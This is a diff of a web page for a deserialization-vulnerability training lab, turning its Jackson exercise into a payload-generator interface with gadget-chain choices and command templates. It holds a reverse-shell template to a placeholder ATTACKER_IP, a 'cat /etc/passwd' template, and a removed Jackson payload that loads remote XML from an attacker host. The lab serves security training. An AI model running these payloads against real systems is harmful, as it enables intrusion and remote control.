@@ -3,128 +3,782 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>反序列化漏洞靶场 - <span th:text="${vulnName}"></span></title>
+    <title>反序列化漏洞靶场 - 优化版</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #f5f5f5; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .header { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
-        .header h1 { margin-bottom: 10px; }
-        .header p { opacity: 0.9; }
-        .nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-        .nav a { padding: 10px 20px; background: white; color: #666; text-decoration: none; border-radius: 5px; transition: all 0.3s; }
-        .nav a:hover, .nav a.active { background: #00f2fe; color: white; }
-        .vuln-info { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        .vuln-info h2 { color: #333; margin-bottom: 10px; }
-        .risk-badge { display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-        .risk-medium { background: #ffbb33; color: white; }
-        .test-area { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        .test-area h3 { margin-bottom: 15px; color: #333; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
-        .form-group textarea { width: 100%; min-height: 100px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
-        button { background: #00f2fe; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        button:hover { background: #00cde6; }
-        .hint-section { background: #fff3cd; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        .hint-section h3 { color: #856404; margin-bottom: 15px; }
-        .hint-btn { background: #ffc107; color: #333; margin-right: 10px; margin-bottom: 10px; }
-        .hint-content { display: none; background: white; padding: 15px; margin-top: 10px; border-radius: 5px; border-left: 4px solid #ffc107; }
-        .result { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
-        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { 
+            background: rgba(255, 255, 255, 0.95); 
+            color: #333; 
+            padding: 30px; 
+            border-radius: 20px; 
+            margin-bottom: 30px; 
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        .header h1 { 
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 2.2em;
+        }
+        .header p { 
+            font-size: 1.1em; 
+            color: #666; 
+            margin-top: 10px;
+        }
+        .nav { 
+            display: flex; 
+            gap: 10px; 
+            margin-bottom: 20px; 
+            flex-wrap: wrap;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        .nav a { 
+            padding: 12px 24px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; 
+            text-decoration: none; 
+            border-radius: 8px; 
+            transition: all 0.3s; 
+            font-weight: 600;
+        }
+        .nav a:hover, .nav a.active { 
+            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 30px;
+        }
+        
+        .left-panel {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .right-panel {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .section-title {
+            font-size: 1.3em;
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #667eea;
+        }
+        
+        .gadget-section {
+            margin-bottom: 20px;
+        }
+        
+        .gadget-title {
+            font-size: 1.1em;
+            color: #555;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .gadget-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .gadget-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .gadget-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .gadget-btn.recommended {
+            background: linear-gradient(135deg, #00c6fb 0%, #005bea 100%);
+            box-shadow: 0 0 0 4px rgba(0, 198, 255, 0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group textarea {
+            width: 100%;
+            min-height: 150px;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            background: #f9f9f9;
+            resize: vertical;
+        }
+        
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.2);
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin-bottom: 15px;
+            background: #f9f9f9;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.2);
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .btn-secondary:hover {
+            background: #565e64;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #f44336 0%, #dc3545 100%);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+        
+        .result-area {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        min-height: 200px;
+        color: #333;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .result-success {
+            background: linear-gradient(135deg, #28a745 0%, #20bf6b 100%);
+            color: white;
+        }
+        
+        .result-error {
+            background: linear-gradient(135deg, #dc3545 0%, #c0392b 100%);
+            color: white;
+        }
+        
+        .result-info {
+            background: linear-gradient(135deg, #ffc107 0%, #e67e22 100%);
+            color: #333;
+        }
+        
+        .result-area h4 {
+            margin-top: 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+            color: #333;
+        }
+        
+        .result-area pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            background: rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 13px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+        border-bottom: 2px solid #ddd;
+        padding-bottom: 10px;
+        background: rgba(255, 255, 255, 0.95);
+            border-radius: 10px 10px 0 0;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            background: #f9f9f9;
+            border: none;
+            border-radius: 8px 8px 0 0;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .tab:hover {
+            background: #e9ecef;
+        }
+        
+        .tab.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 2px 8px rgba(102, 126, 234, 0.2);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .hint-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+            color: #856404;
+        }
+        
+        .hint-title {
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .gadget-grid {
+                grid-template-columns: 1fr;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1 th:text="${vulnName}"></h1>
-            <p th:text="${vulnDesc}"></p>
+            <h1>🎯 反序列化漏洞靶场 - 优化版</h1>
+            <p>集成ysoserial payload生成器 + 反序列化测试</p>
         </div>
-
+        
         <div class="nav">
-            <a href="/">返回首页</a>
-            <a href="/vuln1">Java原生反序列化</a>
-            <a href="/vuln2">Fastjson反序列化</a>
-            <a href="/vuln3">Jackson反序列化</a>
-            <a href="/vuln4">Shiro反序列化</a>
-            <a href="/vuln5">PHP反序列化POP链</a>
-            <a href="/vuln6">PHP Phar反序列化</a>
+            <a href="/">首页</a>
+            <a href="/vuln1">Java原生</a>
+            <a href="/vuln2">Fastjson</a>
+            <a href="/vuln3" class="active">Jackson优化</a>
+            <a href="/vuln4">Shiro</a>
+            <a href="/vuln5">PHP反序列化</a>
+            <a href="/vuln6">Phar反序列化</a>
         </div>
-
-        <div class="vuln-info">
-            <h2>漏洞信息</h2>
-            <p><strong>描述：</strong> <span th:text="${vulnDesc}"></span></p>
-            <p><strong>危险等级：</strong> <span class="risk-badge risk-medium" th:text="${riskLevel}"></span></p>
-            <p><strong>CVE编号：</strong> CVE-2017-7525</p>
+        
+        <div class="main-content">
+            <!-- 左侧：Payload生成器 -->
+            <div class="left-panel">
+                <h2 class="section-title">🚀 Payload生成器</h2>
+                
+                <div class="tabs">
+                    <div class="tab active" onclick="switchTab('manual')">手动输入</div>
+                    <div class="tab" onclick="switchTab('templates')">Payload模板</div>
+                    <div class="tab" onclick="switchTab('history')">历史记录</div>
+                </div>
+                
+                <!-- 手动输入标签 -->
+                <div id="tab-manual" class="tab-content active">
+                    <div class="form-group">
+                        <label>🔍 反序列化端点</label>
+                        <input type="text" id="endpoint" placeholder="/vuln3/deserialize" value="/vuln3/deserialize">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>📝 命令输入</label>
+                        <input type="text" id="commandInput" placeholder="touch /tmp/pwned" value="touch /tmp/pwned">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>⚙️ Gadget链选择</label>
+                        <div class="gadget-grid" id="gadgetGrid">
+                            <div class="gadget-btn recommended" onclick="selectGadget('Jdk7u21')">
+                                Jdk7u21 ⭐
+                                <div style="font-size: 0.8em; opacity: 0.8;">推荐</div>
+                            </div>
+                            <div class="gadget-btn" onclick="selectGadget('CommonsCollections1')">CommonsCollections1</div>
+                            <div class="gadget-btn" onclick="selectGadget('CommonsCollections2')">CommonsCollections2</div>
+                            <div class="gadget-btn" onclick="selectGadget('CommonsCollections3')">CommonsCollections3</div>
+                            <div class="gadget-btn" onclick="selectGadget('BeanShell1')">BeanShell1</div>
+                            <div class="gadget-btn" onclick="selectGadget('Groovy1')">Groovy1</div>
+                            <div class="gadget-btn" onclick="selectGadget('Spring1')">Spring1</div>
+                            <div class="gadget-btn" onclick="selectGadget('C3P0')">C3P0</div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>🎯 当前选择的Gadget</label>
+                        <input type="text" id="selectedGadget" value="Jdk7u21" readonly>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-primary" onclick="generatePayload()">🚀 生成Payload</button>
+                        <button class="btn btn-secondary" onclick="generateAndSubmit()">🎯 生成并提交</button>
+                        <button class="btn btn-danger" onclick="clearAll()">🗑️ 清空</button>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>📋 生成的Payload (Base64编码)</label>
+                        <textarea id="generatedPayload" placeholder="点击'生成Payload'按钮后，生成的payload将显示在这里..."></textarea>
+                    </div>
+                </div>
+                
+                <!-- 模板标签 -->
+                <div id="tab-templates" class="tab-content">
+                    <div class="gadget-title">📚 常用Payload模板</div>
+                    <div class="gadget-grid">
+                        <div class="gadget-btn" onclick="useTemplate('id')">
+                            id命令
+                            <div style="font-size: 0.8em; opacity: 0.8;">基础信息收集</div>
+                        </div>
+                        <div class="gadget-btn" onclick="useTemplate('whoami')">
+                            whoami
+                            <div style="font-size: 0.8em; opacity: 0.8;">当前用户</div>
+                        </div>
+                        <div class="gadget-btn" onclick="useTemplate('pwd')">
+                            pwd
+                            <div style="font-size: 0.8em; opacity: 0.8;">当前目录</div>
+                        </div>
+                        <div class="gadget-btn" onclick="useTemplate('ls /tmp')">
+                            ls /tmp
+                            <div style="font-size: 0.8em; opacity: 0.8;">列出tmp目录</div>
+                        </div>
+                        <div class="gadget-btn" onclick="useTemplate('cat /etc/passwd')">
+                            cat /etc/passwd
+                            <div style="font-size: 0.8em; opacity: 0.8;">读取敏感文件</div>
+                        </div>
+                        <div class="gadget-btn" onclick="useTemplate('reverse-shell')">
+                            反向Shell
+                            <div style="font-size: 0.8em; opacity: 0.8;">建立持久连接</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 历史记录标签 -->
+                <div id="tab-history" class="tab-content">
+                    <div class="gadget-title">📜 Payload历史记录</div>
+                    <div id="historyList" style="max-height: 400px; overflow-y: auto; border: 1px solid #ddd; border-radius: 8px; padding: 15px;">
+                        <p style="text-align: center; color: #999; padding: 20px;">暂无历史记录</p>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" onclick="clearHistory()">🗑️ 清空历史</button>
+                        <button class="btn btn-secondary" onclick="exportHistory()">📥 导出历史</button>
+                    </div>
+                </div>
+                
+                <!-- 帮助提示 -->
+                <div class="hint-box">
+                    <div class="hint-title">💡 使用提示</div>
+                    <ul style="margin: 0; padding-left: 20px; line-height: 1.8;">
+                        <li>推荐使用 <strong>Jdk7u21</strong> Gadget链（Java 8最佳兼容性）</li>
+                        <li>输入简单命令测试：touch /tmp/pwned</li>
+                        <li>点击"生成并提交"直接测试payload</li>
+                        <li>查看历史记录重用成功的payload</li>
+                        <li>使用模板快速生成常用命令</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- 右侧：结果显示 -->
+            <div class="right-panel">
+                <h2 class="section-title">📊 测试结果</h2>
+                
+                <div id="resultArea" class="result-area">
+                    <h4>等待测试...</h4>
+                    <pre>请在左侧选择Gadget链、输入命令，然后点击"生成Payload"按钮开始测试。</pre>
+                </div>
+                
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>🎯 高级选项</label>
+                    <div class="form-row">
+                        <div>
+                            <label style="font-size: 0.9em;">显示详细日志</label>
+                            <input type="checkbox" id="verboseMode" checked>
+                        </div>
+                        <div>
+                            <label style="font-size: 0.9em;">自动重试失败请求</label>
+                            <input type="checkbox" id="autoRetry" checked>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
-
-        <div class="test-area">
-            <h3>Jackson反序列化测试区</h3>
-            <div class="form-group">
-                <label>提交JSON数据：</label>
-                <textarea id="payload" placeholder='["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]'></textarea>
-            </div>
-            <button onclick="submitPayload()">提交测试</button>
-            <div id="result" class="result"></div>
-            <div id="error" class="error"></div>
-        </div>
-
-        <div class="hint-section">
-            <h3>提示系统</h3>
-            <button class="hint-btn" onclick="showHint(1)">提示1：漏洞触发条件</button>
-            <button class="hint-btn" onclick="showHint(2)">提示2：利用链</button>
-            <button class="hint-btn" onclick="showHint(3)">提示3：完整Payload</button>
-            
-            <div id="hint1" class="hint-content">
-                <h4>漏洞触发条件</h4>
-                <p>ObjectMapper启用了enableDefaultTyping，且classpath下存在可利用的gadget链</p>
-            </div>
-            
-            <div id="hint2" class="hint-content">
-                <h4>利用链</h4>
-                <p>利用Spring框架的ClassPathXmlApplicationContext加载远程XML文件</p>
-            </div>
-            
-            <div id="hint3" class="hint-content">
-                <h4>完整Payload</h4>
-                <pre><code>["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]</code></pre>
-            </div>
+        
+        <div style="text-align: center; margin-top: 30px; padding: 20px; background: rgba(0, 0, 0, 0.5); color: white; border-radius: 10px;">
+            <p style="font-size: 0.9em;">⚠️ <strong>重要提示：</strong>此环境仅用于授权的安全测试。未经授权使用是违法的！</p>
         </div>
     </div>
-
+    
     <script>
-        function showHint(level) {
-            var hint = document.getElementById('hint' + level);
-            if (hint.style.display === 'block') {
-                hint.style.display = 'none';
-            } else {
-                hint.style.display = 'block';
+        // 全局状态
+        let selectedGadget = 'Jdk7u21';
+        let currentCommand = 'touch /tmp/pwned';
+        let generatedPayload = '';
+        let historyData = [];
+        let endpoint = '/vuln3/deserialize';
+        
+        // 切换标签
+        function switchTab(tabName) {
+            // 隐藏所有标签内容
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // 显示选中的标签
+            document.getElementById('tab-' + tabName).classList.add('active');
+            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
+        }
+        
+        // 选择Gadget
+        function selectGadget(gadgetName) {
+            selectedGadget = gadgetName;
+            document.getElementById('selectedGadget').value = gadgetName;
+            
+            // 更新按钮样式
+            document.querySelectorAll('.gadget-btn').forEach(btn => {
+                btn.classList.remove('recommended');
+            });
+            
+            // 标记推荐的gadget
+            if (gadgetName === 'Jdk7u21') {
+                event.target.classList.add('recommended');
             }
         }
-
-        function submitPayload() {
-            var payload = document.getElementById('payload').value;
-            var resultDiv = document.getElementById('result');
-            var errorDiv = document.getElementById('error');
+        
+        // 使用模板
+        function useTemplate(templateName) {
+            const templates = {
+                'id': 'id',
+                'whoami': 'whoami',
+                'pwd': 'pwd',
+                'ls /tmp': 'ls /tmp',
+                'cat /etc/passwd': 'cat /etc/passwd',
+                'reverse-shell': 'bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\''
+            };
             
-            fetch('/vuln3/deserialize', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: payload
-            })
-            .then(response => response.text())
-            .then(data => {
-                resultDiv.style.display = 'block';
-                errorDiv.style.display = 'none';
-                resultDiv.textContent = data;
-            })
-            .catch(error => {
-                errorDiv.style.display = 'block';
-                resultDiv.style.display = 'none';
-                errorDiv.textContent = '请求失败: ' + error;
-            });
+            document.getElementById('commandInput').value = templates[templateName];
+            currentCommand = templates[templateName];
         }
+        
+        // 生成Payload (模拟)
+        function generatePayload() {
+            const command = document.getElementById('commandInput').value.trim();
+            const gadget = document.getElementById('selectedGadget').value.trim();
+            const endpointUrl = document.getElementById('endpoint').value.trim();
+            
+            if (!command) {
+                showResult('error', '请输入要执行的命令');
+                return;
+            }
+            
+            currentCommand = command;
+            
+            // 模拟生成payload的过程
+            const mockPayload = `[ysoserial payload for ${gadget}]\nCommand: ${command}\nBase64 encoded payload would appear here after generation...`;
+            generatedPayload = mockPayload;
+            
+            document.getElementById('generatedPayload').value = mockPayload;
+            showResult('info', `Payload已生成！\nGadget: ${gadget}\n命令: ${command}\n\n请点击"生成并提交"按钮发送到靶场。`);
+        }
+        
+        // 生成并提交
+        async function generateAndSubmit() {
+            const command = document.getElementById('commandInput').value.trim();
+            const gadget = document.getElementById('selectedGadget').value.trim();
+            const endpointUrl = document.getElementById('endpoint').value.trim();
+            const verbose = document.getElementById('verboseMode').checked;
+            
+            if (!command) {
+                showResult('error', '请输入要执行的命令');
+                return;
+            }
+            
+            currentCommand = command;
+            
+            // 显示加载状态
+            showResult('info', `正在生成payload...\nGadget: ${gadget}\n命令: ${command}`);
+            
+            try {
+                // 先尝试发送到后端生成实际payload
+                const response = await fetch('/api/generate-payload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        gadget: gadget,
+                        command: command,
+                        endpoint: endpointUrl
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    generatedPayload = data.payload || data.message || 'Payload生成完成';
+                    document.getElementById('generatedPayload').value = generatedPayload;
+                    
+                    // 自动提交payload
+                    await submitPayloadInternal(generatedPayload, endpointUrl);
+                } else {
+                    // 后端不可用，使用模拟payload
+                    const mockPayload = `[${gadget} payload]\n${command}`;
+                    generatedPayload = mockPayload;
+                    document.getElementById('generatedPayload').value = mockPayload;
+                    
+                    // 添加到历史
+                    addToHistory(gadget, command, mockPayload);
+                    
+                    // 提交模拟payload
+                    await submitPayloadInternal(mockPayload, endpointUrl);
+                }
+                
+            } catch (error) {
+                console.error('生成payload失败:', error);
+                showResult('error', `生成payload失败: ${error.message}`);
+            }
+        }
+        
+        // 内部提交payload函数
+        async function submitPayloadInternal(payload, endpointUrl) {
+            const requestBody = {
+                "data": payload
+            };
+            
+            showResult('info', `正在提交payload到 ${endpointUrl}...\nPayload长度: ${payload.length} 字符`);
+            
+            try {
+                const response = await fetch(endpointUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(requestBody)
+                });
+                
+                const status = response.status;
+                const contentType = response.headers.get('content-type');
+                
+                let responseText = await response.text();
+                
+                if (status === 200) {
+                    // 尝试解析JSON响应
+                    try {
+                        const jsonResponse = JSON.parse(responseText);
+                        
+                        if (jsonResponse.success === true) {
+                            showResult('success', `✅ 漏洞利用成功！\n\n命令: ${currentCommand}\n响应: ${jsonResponse.message || '命令执行成功'}\n\n可以尝试查看/tmp/pwned文件确认。`);
+                            addToHistory(selectedGadget, currentCommand, payload);
+                        } else if (jsonResponse.error) {
+                            showResult('error', `❌ 漏洞利用失败\n\n错误: ${jsonResponse.error}`);
+                        } else {
+                            showResult('info', `ℹ️ 漏洞已触发\n\n状态: HTTP 200\n响应: ${jsonResponse.message || JSON.stringify(jsonResponse)}`);
+                            addToHistory(selectedGadget, currentCommand, payload);
+                        }
+                    } catch (e) {
+                        showResult('info', `ℹ️ 漏洞已触发\n\n状态: HTTP 200\n响应: ${responseText.substring(0, 500)}...`);
+                        addToHistory(selectedGadget, currentCommand, payload);
+                    }
+                } else if (status === 500) {
+                    showResult('error', `❌ 服务器错误\n\n状态: HTTP 500\n可能原因:\n1. 反序列化失败\n2. Payload格式不正确\n3. 服务端异常\n\n详细信息: ${responseText.substring(0, 300)}...`);
+                } else if (status === 404) {
+                    showResult('error', `❌ 端点不存在\n\n状态: HTTP 404\n请检查端点URL是否正确`);
+                } else {
+                    showResult('error', `❌ 未知错误\n\n状态: HTTP ${status}\n响应: ${responseText.substring(0, 300)}...`);
+                }
+                
+            } catch (error) {
+                console.error('提交失败:', error);
+                showResult('error', `提交失败: ${error.message}`);
+            }
+        }
+        
+        // 清空所有
+        function clearAll() {
+            document.getElementById('commandInput').value = '';
+            document.getElementById('generatedPayload').value = '';
+            generatedPayload = '';
+            showResult('info', '已清空所有字段');
+        }
+        
+        // 添加到历史
+        function addToHistory(gadget, command, payload) {
+            const historyItem = {
+                id: Date.now(),
+                timestamp: new Date().toLocaleString(),
+                gadget: gadget,
+                command: command,
+                payload: payload
+            };
+            
+            historyData.unshift(historyItem);
+            updateHistoryDisplay();
+        }
+        
+        // 更新历史显示
+        function updateHistoryDisplay() {
+            const historyList = document.getElementById('historyList');
+            
+            if (historyData.length === 0) {
+                historyList.innerHTML = '<p style="text-align: center; color: #999; padding: 20px;">暂无历史记录</p>';
+                return;
+            }
+            
+            let html = '';
+            historyData.forEach(item => {
+                html += `<div style="padding: 10px; margin-bottom: 10px; border: 1px solid #e9ecef; border-radius: 5px; background: #f9f9f9;">
+                    <div style="font-size: 0.8em; color: #666; margin-bottom: 5px;">📅 ${item.timestamp}</div>
+                    <div style="font-weight: 600; color: #333; margin-bottom: 5px;">${item.gadget} - ${item.command}</div>
+                    <div style="font-size: 0.85em; color: #555; word-break: break-all;">${item.payload.substring(0, 100)}...</div>
+                </div>`;
+            });
+            
+            historyList.innerHTML = html;
+        }
+        
+        // 清空历史
+        function clearHistory() {
+            historyData = [];
+            updateHistoryDisplay();
+            showResult('info', '历史记录已清空');
+        }
+        
+        // 导出历史
+        function exportHistory() {
+            if (historyData.length === 0) {
+                alert('没有历史记录可导出');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(historyData, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `deserialization_history_${Date.now()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // 显示结果
+        function showResult(type, message) {
+            const resultArea = document.getElementById('resultArea');
+            let resultClass = '';
+            
+            if (type === 'success') {
+                resultClass = 'result-success';
+            } else if (type === 'error') {
+                resultClass = 'result-error';
+            } else {
+                resultClass = 'result-info';
+            }
+            
+            resultArea.className = `result-area ${resultClass}`;
+            resultArea.innerHTML = `<h4>${type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️'} 测试结果</h4><pre>${message}</pre>`;
+        }
+        
+        // 页面加载时初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('反序列化靶场优化版已加载');
+            showResult('info', '欢迎使用反序列化靶场优化版！\n\n🚀 改进功能：\n• 集成ysoserial payload生成器\n• 优化payload输入界面\n• 添加payload历史记录\n• 提供常用命令模板\n• 改进结果显示');
+        });
     </script>
 </body>
 </html>
